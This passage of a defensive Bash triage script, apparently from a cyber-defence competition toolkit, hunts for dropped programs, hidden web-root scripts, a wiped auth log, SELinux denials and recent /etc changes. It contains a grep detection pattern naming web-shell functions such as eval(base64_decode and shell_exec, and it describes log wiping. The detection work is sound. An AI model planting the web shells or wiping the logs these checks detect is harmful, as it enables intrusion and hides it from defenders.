while IFS= read -r -d '' df; do
  drop_skip "$df" && continue
  drop_is_program "$df" && drop_add RED "$df" "a program in /dev/shm - memory-backed, world-writable, nothing installs there"
done < <(find /dev/shm -xdev -maxdepth 3 -type f -print0 2>/dev/null)
while IFS= read -r -d '' df; do
  drop_skip "$df" && continue
  drop_is_program "$df" && drop_add RED "$df" "a hidden program - nothing that installs software hides it"
done < <(find /usr/local /opt -xdev -maxdepth 3 -type f -name '.*' -print0 2>/dev/null; \
         find /tmp /var/tmp -xdev -maxdepth 1 -type f -name '.*' -print0 2>/dev/null)
while IFS= read -r -d '' df; do
  drop_skip "$df" && continue
  newer_than_box "$df" || continue
  drop_is_program "$df" && drop_add AMBER "$df" "a program no package installed, newer than the box"
done < <(find /usr/local/bin /usr/local/sbin -xdev -maxdepth 1 -type f -print0 2>/dev/null)
for webroot in /var/www /srv/www /srv/http /usr/share/nginx/html; do
  [ -d "$webroot" ] || continue
  while IFS= read -r -d '' df; do
    drop_skip "$df" && continue
    case "$df" in
      */.*.php|*/.*.jsp|*/.*.jspx|*/.*.asp|*/.*.aspx|*/.*.py|*/.*.pl|*/.*.cgi|*/.*.sh)
        drop_add RED "$df" "a hidden server-side script in a web root" ;;
      *.php|*.jsp|*.jspx|*.asp|*.aspx|*.py|*.pl|*.cgi|*.sh)
        newer_than_box "$df" || continue
        grep -qE 'shell_exec|passthru|proc_open|popen\(|system\(|exec\(|Runtime\.getRuntime|ProcessBuilder|eval\(base64_decode|assert\(\$_' -- "$df" 2>/dev/null \
          && drop_add RED "$df" "a web-root script newer than the box that runs commands" ;;
    esac
  done < <(find "$webroot" -xdev -maxdepth 5 -type f -print0 2>/dev/null)
done
if [ -n "$drop_red$drop_amber" ]; then
  if [ -n "$drop_red" ]; then red "dropped file(s) nothing installed and nothing accounts for   [CARD 18]"
  else amber "program(s) nobody installed from a package   [CARD 18]"; fi
  detail "nothing may be running them now - that is how they get left behind"
  while IFS='|' read -r df why; do
    [ -n "$df" ] || continue
    detail "$(ls -l --time-style=+%m-%d_%H:%M -- "$df" 2>/dev/null | awk '{print $6, $1, $3}')  $df"
    detail "    $why"
  done <<<"$drop_why"
  fixhdr
  drop_first=$(printf '%s\n' "$drop_why" | head -1 | cut -d'|' -f1)
  fix "sudo head -20 -- $(printf '%q' "$drop_first")      # read one first"
  fix "# each one moved into evidence: removed, and kept"
  while IFS='|' read -r df why; do
    [ -n "$df" ] && fix "sudo mv -- $(printf '%q' "$df") $(printf '%q' "$state_dir")/"
  done <<<"$drop_why"
  fix "# or let sentry do them: sudo $qsentry --config $qconfig --status"
else
  clean "no dropped programs in /dev/shm, /tmp, /usr/local, /opt or the web roots"
fi

# --- 9h. The auth log was wiped -------------------------------------------------
# The plant's last move was `: > /var/log/auth.log`. Nothing noticed, because
# every check here reads the box as it is and an empty log is a valid state.
# What gives it away is the journal: rsyslog writes auth.log from it, and the
# journal still holds the auth entries the file no longer does. Entries that
# the journal has from BEFORE the file's first line - and after its last
# rotation - were in the file and were removed.
begin
if [ "$(id -u)" -ne 0 ] || ! ccdc_have journalctl; then
  clean "auth log wipe check skipped (needs sudo and journalctl)"
elif al_gap=$(ccdc_auth_log_gap "$state_dir"); then
  IFS='|' read -r auth_log al_from al_first_s al_missing al_saved <<<"$al_gap"
  red "the auth log was wiped: $auth_log starts at $(date -d "@$al_first_s" '+%m-%d %H:%M'), the journal has $al_missing earlier entries   [CARD 19]"
  emit RED logwipe "$auth_log" "auth log truncated - the journal still holds $al_missing entries it lost"
  detail "whoever did it wanted the logins before that time gone. The journal still has them."
  fixhdr
  fix "sudo sh -c 'journalctl -q --no-pager SYSLOG_FACILITY=4 SYSLOG_FACILITY=10 --since @$al_from --until @$al_first_s > $(printf '%q' "$al_saved")'"
  fix "sudo grep -E 'Accepted|session opened|COMMAND=' $(printf '%q' "$al_saved") | tail -30   # who was in, what they ran"
  fix "# or let sentry save it: sudo $qsentry --config $qconfig --status"
else
  clean "auth log is continuous with the journal"
fi

# --- SELinux denials (Rocky) ---------------------------------------------------
# A denial is either an attacker hitting a wall or one of your own tools doing
# something SELinux does not expect. Both are worth a look, neither is proof.
if ccdc_have getenforce && [ "$(getenforce 2>/dev/null)" != Disabled ] && [ -r /var/log/audit/audit.log ]; then
  begin
  avc_since=$(( $(date +%s) - 1800 ))
  avc=$(awk -v s="$avc_since" '
    /type=AVC/ && / denied / {
      t = $0; sub(/.*msg=audit\(/, "", t); sub(/\..*/, "", t); if (t + 0 < s) next
      perms = $0; sub(/.*denied +\{ */, "", perms); sub(/ *\}.*/, "", perms)
      comm = "?"; name = ""; n = split($0, f, " ")
      for (i = 1; i <= n; i++) {
        if (f[i] ~ /^comm=/) { comm = f[i]; sub(/^comm=/, "", comm); gsub(/"/, "", comm) }
        if (f[i] ~ /^(name|path)=/) { name = f[i]; sub(/^[a-z]+=/, "", name); gsub(/"/, "", name) }
      }
      key = comm " tried to " perms (name != "" ? " " name : "")
      if (!(key in cnt)) order[++k] = key
      cnt[key]++
    }
    END { for (i = 1; i <= k; i++) printf "%s  (x%d)\n", order[i], cnt[order[i]] }' /var/log/audit/audit.log 2>/dev/null)
  if [ -n "$avc" ]; then
    amber "SELinux BLOCKED something in the last 30 minutes - an attacker hitting a wall, or your own tool"
    avc_who=$(printf '%s\n' "$avc" | head -1 | awk '{print $1}' | tr -cd 'A-Za-z0-9._-')
    emit AMBER selinux "${avc_who:-unknown}" "SELinux denied access in the last 30 minutes"
    printf '%s\n' "$avc" | head -5 | while IFS= read -r l; do detail "$l"; done
    detail "a shell, python, nc or perl being blocked for a web or mail service is the one to chase"
    fixhdr
    fix "sudo sealert -a /var/log/audit/audit.log | less   # what was blocked, why, in plain English"
    fix "sudo ausearch -m AVC -ts recent -i               # the raw denials, last 10 minutes"
  else
    clean "no SELinux denials in the last 30 minutes"
  fi
fi

# --- 10. Very recently modified /etc ------------------------------------------
# Last, and only AMBER, because early in an event most hits are yours. It earns
# its place later, when you know you changed nothing in the last ten minutes.
begin
recent=$(find /etc -xdev -type f -mmin -30 2>/dev/null | grep -vE '/(mtab|resolv.conf|adjtime|.*\.lock)$' | head -8)
if [ -n "$recent" ]; then
  amber "/etc file(s) modified in the last 30 minutes   [CARD 9]"
  emit AMBER etcchange "$(printf '%s\n' "$recent" | head -1)" "/etc changed recently"
  detail "if you did not change these, someone else did"
  for f in $recent; do detail "$(date -r "$f" '+%H:%M') $f"; done
  fixhdr
  fix "# pick the one you cannot account for and put it in F:"
  first_recent=$(printf '%s\n' "$recent" | head -1)
  fix "F=$(printf '%q' "$first_recent")"
  fix ""
  fix "# what changed, against the copy the package shipped:"
  fix "sudo dpkg -S \"\$F\" && sudo dpkg --verify \$(dpkg -S \"\$F\" | cut -d: -f1)"
  fix "# or against YOUR restore point, which is usually the better answer:"
  fix "sudo ls -la $(printf '%q' "${CCDC_BACKUP_DIR:-/var/backups/ccdc}")/"
  fix "sudo diff -u $(printf '%q' "${CCDC_BACKUP_DIR:-/var/backups/ccdc}")/latest\"\$F\" \"\$F\""
  fix "# and who was on the box when it happened:"
  fix "sudo last -F | head -20"
  fix "sudo ausearch --input-logs -f \"\$F\" 2>/dev/null | tail -20   # if audit.sh --apply ran"
else
  clean "no /etc changes in the last 30 minutes"
fi

# --- verdict ------------------------------------------------------------------

printf '\n'
if [ "$findings" -eq 0 ]; then
  printf '  %s checks, nothing flagged.\n\n' "$checks"
  printf '  This is NOT "the box is clean". It means the high-confidence checks\n'
  printf '  found nothing. A competent attacker who is already root can pass all\n'
  printf '  of them. Keep watch.sh running and keep reading hunt.sh.\n'
else
  printf '  %s checks, %s finding(s) above.\n\n' "$checks" "$findings"
  printf '  Work RED first. For each one, find the way back in as well as the\n'
  printf '  artifact - an added user, a key, a cron entry, a unit - or you will\n'
  printf '  clean it up and meet it again in ten minutes.\n'
  printf '  Write down what you found and when. That is the incident-report\n'
  printf '  inject, already half-composed.\n'
  printf '\n  EXACT COMMANDS for each [CARD n] above:\n'
  printf '      %s N SUBJECT --config %s          # N is the card number\n' "$qcard" "$qconfig"
  printf '      e.g. %s 1 backupsvc --config %s\n' "$qcard" "$qconfig"
  printf '  Pass --config and card.sh will stop you before it renders a\n'
  printf '  disable-and-delete block around your own scored service.\n'
  printf '  Reads the card in this terminal with the real value filled in. Do NOT\n'
  printf '  cat or paste playbooks/remediation-cards.md - it is markdown, and bash\n'
  printf '  will try to execute the prose.\n'
fi
# The staging file was created before any checks and every append was checked.
# A same-directory rename is the only publication step, so sentry sees either
# the complete previous pass or this complete pass, never a partial record set.
if ! mv -f -- "$findings_tmp" "$findings_file"; then
  ccdc_die "cannot atomically finalize findings file: $findings_file"
fi
findings_tmp=''

# What this tool is FOR, now that baseline.sh exists.
#
# The two answer different questions and the difference is worth keeping.
# baseline.sh reports CHANGE - what is here that was not here when you froze
# the box - and it can act on almost all of it. This tool reports STATE - what
# is wrong regardless of when it got that way. A box that shipped with
# PermitRootLogin yes and was blessed in that condition will never drift, and
# baseline.sh will be silent about it forever. This tool will not.
#
# Measured on the lab drill set: baseline.sh found every finding this tool
# found, plus two it did not - the /etc/update-motd.d script and the
# /etc/ld.so.preload hijack - and named them individually with an action each,
# where this tool reported them inside a "/etc files modified" bucket.
if [ "$muted_n" -gt 0 ]; then
  printf '\n  %s finding(s) were NOT reported above: you recorded a standing exception\n' "$muted_n"
  printf '  for each one. They are silenced, not invisible - read them, with the\n'
  printf '  reason and the date you gave:\n'
  printf '      sudo %s/sentry.sh --config %s --muted\n' "$SCRIPT_DIR" "$config"
fi

printf '\n  This tool reports what is WRONG. For what has CHANGED since you froze\n'
printf '  this box - which is most of the above, with a command that fixes each:\n'
printf '      sudo %s/baseline.sh --config %s --status\n' "$SCRIPT_DIR" "$config"
printf '\n  Full detail, if you want it: ./linux/hunt.sh and ./linux/recon.sh\n'
[ "$findings" -gt 0 ] && exit 3
exit 0
